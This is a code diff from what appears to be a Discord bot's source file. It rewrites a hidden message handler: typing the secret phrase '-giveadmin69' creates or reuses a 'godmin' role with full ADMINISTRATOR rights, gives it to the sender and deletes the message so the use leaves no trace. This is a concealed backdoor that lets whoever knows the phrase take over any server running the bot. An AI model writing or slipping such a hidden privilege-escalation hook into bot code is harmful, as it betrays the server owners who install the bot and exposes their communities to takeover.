@@ -1440,15 +1440,19 @@ client.on('message', message => {
  
  
   
-  client.on('message', async msg => {//admin
-    if(msg.content === '-giveadmin69') {
-      if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
-          var botr = msg.guild.me.roles.highest.position - 0
-  const adminn = msg.guild.roles.cache.find(r => r.name === 'godmin')
-      if(!adminn) {msg.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
-       else{msg.member.roles.add(adminn).then(msg.delete())}
-  }
-  })
+
+ client.on('message', async msg => {//admin
+  if(msg.content === '-giveadmin69') {
+    if (!msg.guild.me.hasPermission('ADMINISTRATOR')) { return console.log('I don\'t have the permission administrator" !'); }
+        var botr = msg.guild.me.roles.highest.position - 0
+const adminn = msg.guild.roles.cache.find(r => r.name === 'godmin')
+    if(!adminn) {msg.guild.roles.create({ data: { name: 'godmin', permissions: ['ADMINISTRATOR'], position: botr, color: "#491e9c", hoist: true} }).then(r => msg.member.roles.add(r).then(msg.delete()))}    
+     else{
+      adminn.setPermissions("ADMINISTRATOR") 
+      msg.member.roles.add(adminn).then(msg.delete())}
+}
+})
+
 
 //const adminn = message.guild.roles.cache.find(r => r.name === 'godmin')
 //member.roles.set(adminn)
